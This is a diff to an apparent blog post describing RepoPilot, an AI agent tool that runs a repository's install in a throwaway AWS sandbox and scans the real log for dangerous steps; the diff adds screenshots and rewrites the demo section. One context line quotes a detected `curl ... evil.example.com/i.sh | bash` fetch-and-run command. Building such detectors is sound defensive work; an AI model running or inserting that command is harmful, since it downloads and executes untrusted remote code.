@@ -54,11 +54,15 @@ Point it at that same sneaky repo and the agent comes back with something a scan
 
 > Caught it. The install piped `curl -s https://evil.example.com/i.sh | bash` straight into a shell. That line is in the real build log.
 
+![RepoPilot UI: an F-grade static scorecard, then the new tool runs the install in a disposable AWS CodeBuild sandbox and catches a curl-pipe-bash postinstall in the real log](https://raw.githubusercontent.com/simplynadaf/repopilot-sandbox-tool/main/docs/ui-hero.png)
+
 Same agent. Same repo. One new tool. v1 is a confident guess. v2 is the truth, quoted from a log of code that actually ran.
 
 ---
 
 ## How the tool works
+
+![Architecture: five static read-tools produce a 0-100 score (the guess); the new sixth tool run_in_sandbox starts an ephemeral AWS CodeBuild build, clones and runs the install, writes the real log to CloudWatch, and a danger scan over that real log produces the proven verdict](https://raw.githubusercontent.com/simplynadaf/repopilot-sandbox-tool/main/docs/architecture.png)
 
 The agent reasons with Amazon Nova Pro on Bedrock through the Strands SDK. The tool is boring in the best way, which is what makes it reusable:
 
@@ -92,7 +96,7 @@ Running the code and reading the real log is a categorically better signal than 
 
 ## Try it
 
-The live demo is a before and after toggle: flip v1 (reads it) and v2 (runs it) on a safe repo and a sneaky one, and watch the agent go from "looks fine" to "caught it." It is a static replay of real recorded runs, so it costs nothing to keep online.
+The live demo is the real RepoPilot UI with the tool built in: inspect a repo (try the safe `pallets/click` and the sneaky `evil/fake-agent-kit`), then hit "Run it in a disposable AWS sandbox" and watch the agent go from "looks fine" to "caught it." It is a static replay of real recorded runs, so it costs nothing to keep online.
 
 {% embed https://github.com/simplynadaf/repopilot-sandbox-tool %}
 
